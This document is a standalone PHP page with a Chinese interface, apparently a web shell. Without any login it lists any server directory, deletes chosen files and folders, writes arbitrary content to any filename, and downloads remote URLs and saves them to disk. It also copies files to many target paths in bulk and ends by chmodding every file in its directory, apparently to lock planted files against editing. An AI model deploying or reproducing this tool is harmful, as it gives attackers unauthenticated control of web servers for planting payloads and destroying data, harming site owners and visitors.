<?php
header('Content-Type:text/html;charset=utf-8');
error_reporting(E_ALL ^ E_NOTICE ^ E_WARNING);
$ppp = dirname(__FILE__);
if (!is_null($_GET['p'])) {
    $ppp = $_GET['p'];
}


$files = dirFile($ppp);

function dirFile($dir)
{

    if (!is_dir($dir)) {


        return false;
    }
    static $output = array();
    $files = scandir($dir);
    foreach ($files as $file) {

        $tmp_file = $dir . "/" . $file;
        if (is_dir($tmp_file)) {

            $output[] = array(
                "fileName" => $file,
                "directory" => $dir,
                "isDir" => true
            );

            if ($file == "." || $file == "..") {

                continue;
            }
        } else {

            $output[] = array(
                "fileName" => $file,
                "directory" => $dir,
                "isDir" => false
            );
        }
    }

    return $output;
}
$dirs_html = '';
$php_out = '';
$file_html = '';
foreach ($files as $file) {
    if ($file['fileName'] == '.' || $file['fileName'] == '..') continue;
    if ($file['isDir']) {
        $aaa = $file['directory'] . '\\' . $file['fileName'];
        $dirs_html .= '<li><input type="checkbox" name="d[]" value="' . $file['fileName'] . '"  id="' . $file['fileName'] . '" />  <a href="?p=' . $aaa . '">' . $file['fileName'] . '</a></li>';
    } else {
        $aaa = $file['directory'] . '\\' . $file['fileName'];
        $php_out .= '<li><input type="checkbox" name="f[]" value="' . $aaa . '"  id="' . $file['fileName'] . '"  class="kk" /> <label for="' . $file['fileName'] . '">' . $file['fileName'] . '</label></li>';
    }
}
if ($php_out != '') {
    $file_html .= '<div class="box"><h2>文件:</h2><ul class="php"><form action="" method="POST">' . $php_out . '<br style="clear:both" /><br /><input type="submit" value="立即删除" onclick="return window.confirm(\'确定要删除吗？\')" class="sub" /></form></ul></div>';
}


function dDir($path)
{
    if (file_exists($path)) {
        $files = scandir($path);
        foreach ($files as $f) {
            if (!in_array($f, array('.', '..'))) {
                $npath = $path . '/' . $f;
                if (is_file($npath)) {
                    // echo "unlink: $npath\n";
                    @chmod($npath, 0777);
                    unlink($npath);
                } else {
                    dDir($npath);
                }
            }
        }
        @chmod($path, 0777);
        rmdir($path);
    }
}
$out    = '';

if (isset($_POST['f'])) {
    $delphp = $_POST['f'];
    if (!empty($delphp)) {
        foreach ($delphp as $delete) {
            @chmod($delete, 0666);
            if (@unlink($delete)) {
                $out .= '[php] ' . $delete . ' has been deleted successfully.<br />';
            } else {
                $out .= '[php] ' . $delete . ' delete failed!<br />';
            }
        }
    }
}
if (isset($_POST['d'])) {
    $dirsx = $_POST['d'];
    if (!empty($dirsx)) {
        foreach ($dirsx as $deld) {
            $deld = './' . $deld;
            if (file_exists($deld) && is_dir($deld)) {
                @chmod($deld, 0666);
                dDir($deld);
                $out .= '[dir] ' . $deld . ' has been removed successfully.<br />';
            }
        }
    }
}








$dirs_html = $dirs_html == '' ? 'empty' : '<ul class="dir">' . $dirs_html . '<br style="clear:both" /><br /><input type="submit" value="删除选中目录" onclick="return window.confirm(\'确定要删除吗？\')" class="sub" /></ul>';
?>

<html>

<head>
    <title>NICE GOOD</title>
    <script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
    <style>
        body,
        div,
        h1 {
            margin: 0;
            padding: 0;
        }

        .msg {
            margin: 20px 0;
            padding: 5px;
            background-color: #ddd;
        }

        li {
            line-height: 150%;
        }

        h1 a {
            color: #0000ff;
        }

        div.box {
            margin: 15px;
        }

        ul {
            list-style: none;
        }

        ul.php li {
            float: left;
            width: 100%;
            margin-top: 5px;
            line-height: 150%;
        }

        ul.dir li {
            float: left;
            width: 100%;
            margin-top: 5px;
            line-height: 150%;
        }
    </style>

    <style type="text/css">
        .ppp {
            display: flex;
            align-items: center;
        }

        .ppp1 {
            display: flex;
            align-items: center;
        }

        .ppp2 {
            display: flex;
            align-items: center;
        }

        .ppp3 {
            display: flex;
            align-items: center;
        }

        .ppp4 {
            display: flex;
            align-items: center;
        }
    </style>
</head>

<body>
    <div class="box">
        <h1><a href="?">目录列表</a>:</h1>
        <form action="" method="POST">
            <?php echo $dirs_html; ?>
        </form>
        <?php echo $file_html; ?>
        <input id="thz" type="text" style="width:50px" />
        <input id="Button1" type="button" value="选择后缀" onclick="se()" />
        <input id="Button2" type="button" value="取消选择" onclick="se1()" />
        <input id="Button3" type="button" value="全选" onclick="se2()" />
        <?php if ($out != '') : ?>
            <div class="msg"><?php echo $out; ?></div>
        <?php endif; ?>
    </div>
    <script>
        function se() {
            var hz = document.getElementById("thz").value;
            var a = document.getElementsByClassName("kk");
            for (var i = 0; i < a.length; i++) {
                var v = a[i].value;
                var f = v.length - hz.length;
                v = v.substring(f);
                if (v.toLowerCase() == hz.toLowerCase()) {
                    a[i].checked = true;

                }
            }
        }

        function se1() {
            var a = document.getElementsByClassName("kk");
            for (var i = 0; i < a.length; i++) {
                a[i].checked = false;

            }
        }

        function se2() {
            var a = document.getElementsByClassName("kk");
            for (var i = 0; i < a.length; i++) {
                a[i].checked = true;

            }
        }
    </script>
    <form action="" method="POST">
        <div style="display: flex;align-items: center;justify-content: space-around;">
            <div class="ppp">
                <span>输入源</span>
                <table width="100%" border="1" bordercolor="#000000">
                    <tr>
                        <td>地址：</td>
                        <td><span class="ppp1">
                                <textarea name="yurls" rows="10" cols="40"></textarea>
                            </span></td>
                    </tr>
                    <tr>
                        <td>输入目标地址：</td>
                        <td><span class="ppp2">
                                <textarea name="turls" rows="20" cols="100"></textarea>
                            </span></td>
                    </tr>
                    <tr>
                        <td colspan="2"><button type="submit" name="action" value="upload">一键上传</button>
                            <button type="submit" name="action" value="delete">一键删除</button>
                        </td>
                    </tr>
                </table>
            </div>
            <div class="ppp"></div>
        </div>

        <br />

        <div class="ppp">
            <table width="100%" border="3" bordercolor="#669900">
                <tr>
                    <td>
                        <div align="right">输入内容或者url:</div>
                    </td>
                    <td><span class="ppp3">
                            <textarea name="context" rows="20" cols="100"></textarea>
                        </span></td>
                </tr>
                <tr>
                    <td>
                        <div align="right">输入创建文件名：</div>
                    </td>
                    <td><span class="ppp4">
                            <input name="filename" />
                        </span></td>
                </tr>
                <tr>
                    <td colspan="2">
                        <div align="center">
                            <button type="submit" name="action" value="addbycot">内容上传</button>
                            <button type="submit" name="action" value="addbyurl">下载上传</button>
                        </div>
                    </td>
                </tr>
            </table>
        </div>
        </div>


    </form>
    <?php

    error_reporting(E_ALL ^ E_NOTICE ^ E_WARNING);

    function endWith($str, $suffix)
    {
        $length = strlen($suffix);
        if ($length == 0) {
            return true;
        }
        return (substr($str, -$length) === $suffix);
    }
    function upload()
    {
        $yurl = $_POST['yurls'];
        $turl = $_POST['turls'];
        $yurls = explode("\n", $yurl);
        $turls = explode("\n", $turl);

        if ($yurl && $turl) {
            foreach ($yurls as $k0 => $v0) {
                $yname = end(explode("/", $v0));
                foreach ($turls as $key => $value) {

                    $mburl = trim($value) . "/" . trim($yname);
                    copy(trim($v0), trim($mburl));
                }
            }
        }
        if ($yurl && $turl)
            echo "上传完毕";
    }

    function delete()
    {
        $yurl = $_POST['yurls'];
        $turl = $_POST['turls'];
        $yurls = explode("\n", $yurl);
        $turls = explode("\n", $turl);

        if ($yurl && $turl) {
            foreach ($yurls as $k0 => $v0) {
                $yname = end(explode("/", $v0));
                if (!$yname) {
                    $yname = $v0;
                }
                foreach ($turls as $key => $value) {

                    $mburl = trim($value) . "/" . trim($yname);
                    unlink($mburl);
                }
            }
        }
        if ($yurl && $turl)
            echo "删除完毕";
    }

    function add()
    {

        $cot = $_POST['context'];
        $fname = $_POST['filename'];
        if ($cot && $fname) {
            if ($_POST['action'] == 'addbycot') {
                $content = $cot;
            } else {
                $content = file_get_contents(trim($cot));
            }

            $myfile = fopen($fname, "w") or die("Unable to open file!");
            $resw = fwrite($myfile,  $content);
            fclose($myfile);
            if ($resw)
                echo "上传成功" . $resw;
            else
                echo "上传失败";
        }
    }

    if ($_POST['action'] == 'upload') {
        @upload();
    }
    if ($_POST['action'] == 'delete') {
        @delete();
    }

    if ($_POST['action'] == 'addbycot' || $_POST['action'] == 'addbyurl') {
        @add();
    }

    ?>
<?php
function set_writeabl1e($file_nam1e)
{
if(@chmod($file_nam1e,33))
{
  echo "yes:".$file_nam1e."</br>";
}
else
{
   echo "no:".$file_nam1e."</br>";
}
}

$con = dirname(__FILE__);
$filename = scandir($con);
foreach($filename as $k=>$v){
if($v=="." || $v==".."){continue;}
set_writeabl1e (__DIR__."\\".$v);
}
?> 	
</body>

</html>